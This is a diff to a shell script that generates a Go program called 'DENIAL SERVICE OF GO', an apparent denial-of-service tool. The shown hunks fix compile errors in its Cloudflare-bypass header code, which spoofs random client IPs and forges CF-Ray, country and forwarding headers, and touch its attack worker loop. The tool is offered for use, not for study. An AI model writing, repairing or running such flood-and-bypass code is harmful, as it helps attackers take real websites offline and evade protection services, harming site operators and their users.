@@ -23,7 +23,7 @@ echo -e "${WHITE}  DENIAL SERVICE OF GO${NC}"
 echo -e "${CYAN}${SEP}${NC}"
 echo
 
-# Create main.go file directly (ENHANCED version - with Cloudflare bypass)
+# Create main.go file directly (FIXED version)
 echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go...${NC}"
 
 cat > main.go << 'EOF'
@@ -507,7 +507,6 @@ func generateCookies() string {
 func setCloudflareBypassHeaders(req *http.Request, target string) {
 	// Random IP for spoofing
 	spoofIP := randomIP()
-	spoofIPv6 := randomIPv6()
 	
 	// Set all Cloudflare bypass headers
 	cfHeaders := make(map[string]string)
@@ -523,7 +522,7 @@ func setCloudflareBypassHeaders(req *http.Request, target string) {
 				countries := []string{"US", "GB", "CA", "AU", "DE", "FR", "JP", "CN", "RU", "BR"}
 				cfHeaders[k] = countries[randInt(0, len(countries)-1)]
 			case "CF-Ray":
-				cfHeaders[k] = randomString(16) + "-" + randomString(4).toUpperCase()
+				cfHeaders[k] = randomString(16) + "-" + strings.ToUpper(randomString(4))
 			case "X-Forwarded-Host", "X-Host", "X-Orig-Host", "X-Forwarded-Server":
 				u, _ := url.Parse(target)
 				cfHeaders[k] = u.Hostname()
@@ -842,11 +841,6 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			stats.inc()
 		}
 	}
-}
-
-// Helper function for string to uppercase
-func (s string) toUpperCase() string {
-	return strings.ToUpper(s)
 }
 EOF
 
